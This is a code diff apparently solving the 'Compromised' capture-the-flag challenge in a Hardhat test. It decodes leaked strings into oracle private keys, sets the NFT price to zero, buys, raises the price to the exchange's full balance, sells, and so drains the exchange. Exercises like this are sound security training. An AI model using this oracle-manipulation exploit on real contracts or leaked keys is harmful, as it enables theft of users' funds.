@@ -1,4 +1,5 @@
 const { expect } = require('chai');
+const { keccak256, parseBytes32String, formatBytes32String } = require('ethers/lib/utils');
 const { ethers } = require('hardhat');
 
 describe('Compromised challenge', function () {
@@ -61,6 +62,38 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        let leak1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
+        let leak2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
+        //address1bytes = ethers.utils.(addres1bytes.split(" "));
+        let convertToPrivateKey = (leaks) => {
+            leaks = leaks.split(" ");
+            let leakstring = leaks.map(x => {
+                return ethers.utils.parseBytes32String("0x" + x + (new Array(63).join("0") ));
+                
+            }).join("");
+            let leakdecoded = ethers.utils.base64.decode(leakstring);
+            return leakedPrivateKey = ethers.utils.toUtf8String(leakdecoded);
+        }
+        let privateKey1 = convertToPrivateKey(leak1);
+        let privateKey2 = convertToPrivateKey(leak2);
+
+        const oracle1 = new ethers.Wallet(privateKey1, ethers.provider);
+        const oracle2 = new ethers.Wallet(privateKey2, ethers.provider);
+        console.log(oracle1.address);
+        console.log(oracle2.address);
+
+        await this.oracle.connect(oracle1).postPrice("DVNFT",0);
+        await this.oracle.connect(oracle2).postPrice("DVNFT",0);
+        await this.exchange.connect(attacker).buyOne({value : 1});
+
+        await this.oracle.connect(oracle1).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE );
+        await this.oracle.connect(oracle2).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE );
+        await this.nftToken.connect(attacker).approve(this.exchange.address,0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await this.oracle.connect(oracle1).postPrice("DVNFT",INITIAL_NFT_PRICE );
+        await this.oracle.connect(oracle2).postPrice("DVNFT",INITIAL_NFT_PRICE );
+        
     });
 
     after(async function () {
